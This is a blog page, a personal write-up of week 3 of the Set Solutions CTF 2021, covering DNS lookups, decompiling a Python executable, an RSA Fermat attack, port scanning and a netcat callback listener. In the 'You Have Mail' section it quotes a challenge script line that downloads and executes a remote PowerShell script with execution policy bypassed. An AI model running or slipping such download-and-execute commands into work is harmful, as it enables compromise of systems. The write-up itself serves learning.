@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+    <meta name="color-scheme" content="light dark">
+
+    
+
+    <meta name="author" content="Adin Drabkin">
+    <meta name="description" content="Quick Navigation
+Week 1 \ Week 2 \ Week 4 Note: Fewer challenge details were documented during week 3.">
+    <meta name="keywords" content="">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Set Solutions CTF 2021 Week 3"/>
+<meta name="twitter:description" content="Quick Navigation
+Week 1 \ Week 2 \ Week 4 Note: Fewer challenge details were documented during week 3."/>
+
+    <meta property="og:title" content="Set Solutions CTF 2021 Week 3" />
+<meta property="og:description" content="Quick Navigation
+Week 1 \ Week 2 \ Week 4 Note: Fewer challenge details were documented during week 3." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://adindrabkin.com/blog/set-solutions-ctf-2021-week3/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2021-11-28T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-11-28T00:00:00+00:00" />
+
+
+    <title>
+  Set Solutions CTF 2021 Week 3 · Adin Drabkin
+</title>
+
+    
+      <link rel="canonical" href="https://adindrabkin.com/blog/set-solutions-ctf-2021-week3/">
+    
+
+    <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.7b314bd953f9bf97050dc5a58a3bc9cea394b9438d373447ddfe7365d5efe091.css" integrity="sha256-ezFL2VP5v5cFDcWlijvJzqOUuUONNzRH3f5zZdXv4JE=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.ccbbada2e264e4fdbf9b2181cccc2cdb289a63dc9520a1e96ac2b9a45778df29.css" integrity="sha256-zLutouJk5P2/myGBzMws2yiaY9yVIKHpasK5pFd43yk=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    <meta name="generator" content="Hugo 0.111.3">
+  </head>
+
+  
+  
+    
+  
+  <body class="preload-transitions colorscheme-auto">
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      Adin Drabkin
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+        
+        
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/" >Home</a>
+          </li>
+        
+        
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/about/" >About</a>
+          </li>
+        
+        
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/blog/" >Blog</a>
+          </li>
+        
+      
+        
+    </ul>
+  
+</section>
+</nav>
+
+      <div class="content">
+        
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="https://adindrabkin.com/blog/set-solutions-ctf-2021-week3/">
+          Set Solutions CTF 2021 Week 3
+        </a>
+      </h1>
+    </header>
+
+    <p><strong>Quick Navigation</strong><br>
+<a href="/blog/set-solutions-ctf-2021-week1">Week 1</a>
+ \
+<a href="/blog/set-solutions-ctf-2021-week2">Week 2</a>
+ \
+<a href="/blog/set-solutions-ctf-2021-week4">Week 4</a>
+</p>
+<p><em>Note: Fewer challenge details were documented during week 3. The website went down shortly after the CTF ended, before I was able to thoroughly document challenge prompts and steps</em></p>
+<p>To skip to detailed writeups from week 3, start reading at <em>Captured Communication</em>.</p>
+<h1 id="save-the-lizards">
+  Save the Lizards
+  <a class="heading-link" href="#save-the-lizards">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p><em>Note: I forgot to record the description for this challenge, however, it contained the text <code>savethelizards.today</code></em></p>
+<p><em>.today</em> is a top-level domain, and a WHOIS lookup revealed that <em>savethelizards.today</em> was a registered domain. A DNS record lookup of <em>savethelizards.today</em> revealed a TXT entry containing the flag.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek3/LizardsFlag.jpg"/>
+</figure>
+
+<h1 id="you-have-mail">
+  You Have Mail
+  <a class="heading-link" href="#you-have-mail">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p><em>Note: I forgot to record the description and many steps taken for this challenge</em></p>
+<p>You Have Mail lead me to a Windows bat script which contained code to download and execute a remote PowerShell script titled <em>ftony.ps1</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bat" data-lang="bat"><span style="display:flex;"><span>PowerShell -NoProfile -NoExit -ExecutionPolicy Bypass -Command iex (New-Object Net.WebClient).DownloadString(&#39;https://ssictfstatic.s3.us-east-2.amazonaws.com/ftony.ps1&#39;)
+</span></span></code></pre></div><p>I downloaded <em>ftony.ps1</em> directly with wget and removed a significant amount of the contents, including a large try-catch block regarding a user interface. I pasted the remaining code into <em><a href="https://tio.run/#powershell" target="_blank" rel="noreferrer noopener">https://tio.run/#powershell</a>
+</em> and clicked <em>run</em>. The flag appeared!</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek3/YouHaveMailFlag.jpg"/>
+</figure>
+
+<h1 id="knocked-off-course">
+  Knocked off Course
+  <a class="heading-link" href="#knocked-off-course">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Challenge description:</p>
+<blockquote>
+<p>The Episilon satellite has been knocked off course. We can attempt some course correction maneuvers, but our odds are not good. All we&rsquo;ve got to work with is a chimpanzee that flew up on a recent mission. At best, you have a 1 in 10,000 chance of getting this right.</p>
+</blockquote>
+<p>Challenge attachments: guessNum</p>
+<p>Knocked off Course contained a 1.8 MB Linux executable called <em>guessNum</em>. Prior to even executing <em>guessNum</em>, I ran <code>strings guessNum</code>, and noticed a significant amount of python references, which implied that <em>guessNum</em> may be a compiled python executable.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek3/KnockedGrepPy.jpg"/>
+</figure>
+
+<p>I extracted the contents of <em>guessNum</em> using <em>pyinstxtractor.py</em><sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek3/KnockedExtracted.jpg"/>
+</figure>
+
+<p>Next, I used <em>uncompyle6</em> to decompile <code>guessNum.pyc</code>, one of the files extracted by pyinstxtractor.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek3/KnockedFlag.jpg"/>
+</figure>
+
+<p>Alternatively, <em>Knocked off Course</em> could have been solved by using <em>pwntools</em> to script interaction with <em>guessNum</em>, as delay between each of the ~10000 guesses would be minimal.</p>
+<h1 id="captured-communication">
+  Captured Communication
+  <a class="heading-link" href="#captured-communication">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Challenge description:</p>
+<blockquote>
+<p>We have a Spy! We have captured a public key, and a ciphered message. Let&rsquo;s catch this spy, otherwise were going to have to reformat the entire system and start over.</p>
+</blockquote>
+<p>Challenge attachments: <code>pub_key</code>, <code>cipher_text</code></p>
+<p>Captured Communication provided two attachments, being <em>pub_key</em> and <em>cipher_text</em>. Note that neither of these files were newline terminated, should you decide to try the challenge yourself.</p>
+<p><em>pub_key</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>-----BEGIN PUBLIC KEY-----
+</span></span><span style="display:flex;"><span>MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQBJfoRSZIBnKN2kwQ5KHDoK
+</span></span><span style="display:flex;"><span>jaYFq79T4XufRQ+taIEk/HaxbPy4R1nelT9T+bWrWOylO0IzWDaPW9Hb9pQjEVdO
+</span></span><span style="display:flex;"><span>LxJdKpeUUZ/xAt6o2GFV0HJrZ9PQD19KvND6yTU1H2poOzmVU5OuObaq2DD5UqoO
+</span></span><span style="display:flex;"><span>UGUdkPfFOU1CGwcP3rhOlTeEWEcuXwZVkJXenWhFXrGjQFbpq3zUfAQ+m7OPh0Y0
+</span></span><span style="display:flex;"><span>Vd6jSJorwoBeA4z3lG+XLsWIdu6uLG755l30k3vtbLLK7tMU8U7li7uCfuCaOn1U
+</span></span><span style="display:flex;"><span>1chbesIu7TejLx7WJHu5YNneCS1L4oC2fFSyEArfUzxPgXKrGcSviqiRaU5NNY81
+</span></span><span style="display:flex;"><span>AgMBAAE=
+</span></span><span style="display:flex;"><span>-----END PUBLIC KEY-----
+</span></span></code></pre></div><p><em>cipher_text</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>4206fac65fce53b4f55cec7e8417724d6174e0e6d6b96da375cea9c1d3c81547a5584316d6e49d2de9f60dfe4daecae061dfc25c822950e22d30b61b6621e2c9c33c46971b6cb0e1b1764a77cf63e6e531cd0b9f24ecd242ba53f2b159be9f8572e0e0ad884946b63ac27394c952ee45ac1009be1d24a5243111f617c807f99f6907555fd258a83dd0eb7ac615caf7c741e225b84ac575727b3c39bb5361f7e08b153b362ccc0ef7e1a492c777d30246b6cc54124de0c95f8214fd45b1a35cf68849179930c595d4bb11087f2cfca0aca63435abfd5456e38cc1111e2d3a21e5e3a04d39451dbecb616802830af9251b84c6b97fbb6024e13c4d704840752d81
+</span></span></code></pre></div><p>Utilizing openssl, I was able to determine that the public key was RSA encrypted, with the command <code>openssl asn1parse -in pub_key</code>.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek3/CapturedOpenSSLParse.jpg"/>
+</figure>
+
+<p>Given that only the public key and cipher text were provided, the next logical CTF step would be to brute force the private key, using RsaCtfTool. The command <code>python3 RsaCtfTool.py --publickey pub_key --uncipherfile cipher_text</code> resulted in RsaCtfTool attempting multiple types of attacks on the encrypted content. After some time, RsaCtfTool attempted a fermat attack, which succeeded, and the utf-8 output of the decrypted ciphertext contained the flag.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek3/CapturedFlag.jpg"/>
+</figure>
+
+<h1 id="to-the-stars">
+  To the Stars
+  <a class="heading-link" href="#to-the-stars">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Challenge description:</p>
+<blockquote>
+<p>WeAre.ReturningTo.Space
+And only one way to get there&hellip;</p>
+</blockquote>
+<p>Challenge image:
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek3/markingTerritory.jpg"/>
+</figure>
+</p>
+<p>Similar to <a href="/blog/set-solutions-ctf-2021-week3/#save-the-lizards">Save the Lizards</a>
+, the description of <em>To the Stars</em> contained text that appeared to be a URL. Given that this challenge again involves public internet-facing infrastructure, I wanted to ensure that any actions I took were—with some confidence—against Set Solutions CTF endpoints. WHOIS and DNS queries of <em>WeAre.ReturningTo.Space</em> revealed that the domain was 31 days old and resolved to the IP address of <code>3.22.44.14</code>, which belonged to an EC2 in the same region as <em>To the Stars</em>.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek3/StarsDNS.jpg"/>
+</figure>
+
+<p>After initial port scans of <code>3.22.44.14</code> revealed nothing, I ran a full syn port scan by executing <code>sudo nmap -p- 3.22.44.14</code>. The full scan revealed that only a single port, <em>42731</em>, was open.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek3/StarsSyn.jpg"/>
+</figure>
+
+<p>A netcat connection to <code>3.22.44.14 42731</code> revealed that the EC2 instance was running OpenSSH on port 42731.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek3/StarsNCPort.jpg"/>
+</figure>
+
+<p>Finally, I SSH&rsquo;d to <code>3.22.44.14 42731</code>, and some ascii art, along with the flag, was returned in the banner.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek3/StarsSSH.jpg"/>
+</figure>
+
+<h1 id="poison-delivery">
+  Poison Delivery
+  <a class="heading-link" href="#poison-delivery">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Challenge description:</p>
+<blockquote>
+<p>Space Force SIGINT has identified a way to intercept foreign communications. Waiting for your input commander, to provide an IP address to redirect the signal to&hellip;</p>
+</blockquote>
+<p>The challenge page for poison delivery contained a prompt for an IP address. After trying various ways to break the input form, I realized that the challenge may take a bit more effort.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek3/PoisonSend.jpg"/>
+</figure>
+
+<p>Presumably, the next steps—or the flag—would be sent to the IP address entered. This challenge is especially interesting because it is very out of the box&ndash;it requires the competitor to listen on a public IP address. In retrospect, my steps for Poison Delivery were:</p>
+<ol>
+<li>Spin up a basic, free EC2 instance with a public IP</li>
+<li>Allow all TCP traffic, disable the firewall and listen with tcpdump</li>
+<li>Determine the port that the challenge attempts to send data to</li>
+<li>Listen with netcat on the port discovered in step 3</li>
+</ol>
+<p>Caught in the thrill of competition, I sped through each step, forgetting to document along the way. I was able to use my free AWS university account to easily spin up an EC2, which went smoothly. I allowed TCP traffic from all IP addresses to the EC2, disabled its firewall (yikes!) and listened with tcpdump. Eventually, a connection on port 38486 was logged! I setup a listener on port 38486 by executing <code>nc -lvnp 38486</code>.</p>
+<p>Finally, I clicked &ldquo;intercept communications&rdquo; one last time, and a request came in containing the flag.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek3/PoisonReceive.jpg"/>
+</figure>
+
+<p><em>Note: you are going to have to take my word on the flag being contained in the 40 content-length of the request.</em></p>
+<p>Week 3 lessons learned: Do not wait a month to document a CTF competition. The infrastructure will most likely be taken down, and all you will have left is broken RsaCtfTool installs.</p>
+<p><strong>Quick Navigation</strong><br>
+<a href="/blog/set-solutions-ctf-2021-week1">Week 1</a>
+ \
+<a href="/blog/set-solutions-ctf-2021-week2">Week 2</a>
+ \
+<a href="/blog/set-solutions-ctf-2021-week4">Week 4</a>
+</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p><a href="https://github.com/extremecoders-re/pyinstxtractor" target="_blank" rel="noreferrer noopener">https://github.com/extremecoders-re/pyinstxtractor</a>
+&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+
+  </article>
+</section>
+
+  
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    ©
+    
+    2024
+     Adin Drabkin 
+    ·
+    Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+      
+      <script src="/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js" integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
